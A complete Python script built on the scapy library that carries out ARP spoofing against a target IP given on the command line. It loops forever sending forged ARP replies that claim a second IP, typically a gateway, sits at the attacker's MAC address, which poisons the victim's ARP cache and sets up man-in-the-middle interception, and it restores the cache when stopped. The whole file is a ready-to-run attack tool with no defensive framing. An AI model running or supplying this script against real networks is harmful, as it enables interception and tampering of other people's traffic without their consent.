from scapy.all import ARP, send, sendp, sr, Ether, get_if_hwaddr, conf
import sys
import time

# Set the network interface to use
conf.iface = "eth0"

def get_mac(ip):
    """
    Resolves the MAC address of a given IP address by sending an ARP request.
    If the MAC address cannot be found, exits the program.
    """
    ans, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[!] Unable to find MAC address for {ip}")
        sys.exit(1)

def arp_spoof(target_ip, spoof_ip):
    """
    Sends a spoofed ARP packet to the target, claiming the spoof IP is at the attacker's MAC address.
    """
    target_mac = get_mac(target_ip)  # Get the victim's MAC address
    my_mac = get_if_hwaddr(conf.iface)  # Get your own MAC address from the active interface
    print(f"[+] Using attacker MAC address: {my_mac}")

    # Create an Ethernet frame and ARP packet for spoofing
    ethernet = Ether(dst=target_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=my_mac)
    packet = ethernet / arp

    # Send the spoofed ARP packet
    sendp(packet, verbose=False)
    print(f"[+] Sent fake ARP packet to target {target_mac}: {spoof_ip} is at {my_mac}")

def restore_arp(target_ip, spoof_ip):
    """
    Sends legitimate ARP packets to restore the ARP table of the target, undoing the spoofing.
    """
    target_mac = get_mac(target_ip)  # Get the MAC address of the target
    spoof_mac = get_mac(spoof_ip)  # Get the real MAC address of the spoofed IP
    # Create a legitimate ARP response
    restore_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(restore_packet, count=4, verbose=False)  # Send the restoration packet multiple times
    print(f"[+] Restored ARP table: {spoof_ip} -> {target_mac}")

if __name__ == "__main__":
    # Ensure the script is called with the correct arguments
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target IP> <spoof IP>")
        sys.exit(1)

    target_ip = sys.argv[1]  # IP address of the target
    spoof_ip = sys.argv[2]  # IP address to spoof

    try:
        print("[*] Starting ARP spoofing. Press Ctrl+C to stop.")
        while True:
            arp_spoof(target_ip, spoof_ip)  # Continuously send spoofed ARP packets
            time.sleep(2)  # Wait 2 seconds between packets
    except KeyboardInterrupt:
        print("\n[!] Detected Ctrl+C. Restoring ARP table...")
        restore_arp(target_ip, spoof_ip)  # Restore the ARP table when exiting
        print("[+] ARP table restored. Exiting.")